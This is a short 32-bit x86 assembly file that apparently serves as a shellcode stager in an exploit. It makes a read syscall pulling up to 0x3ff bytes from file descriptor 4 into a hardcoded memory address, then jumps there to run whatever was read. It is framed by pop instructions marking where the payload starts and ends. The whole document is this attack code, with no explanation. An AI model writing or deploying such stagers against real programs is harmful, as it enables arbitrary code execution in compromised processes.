section     .text
global      _start

_start:
  pop eax
  pop eax
  pop eax
  pop eax ; start

  xor eax, eax
  mov edx, eax  ; edx = 0
  mov ebx, eax  ; ebx = 0
  mov al, 3
  mov ecx, 0x804c330
  mov bl, 4
  mov dx, 0x3ff
  int 0x80

  mov eax, 0x804c330
  jmp eax

  pop eax ; end
  pop eax
  pop eax
  pop eax


section     .data
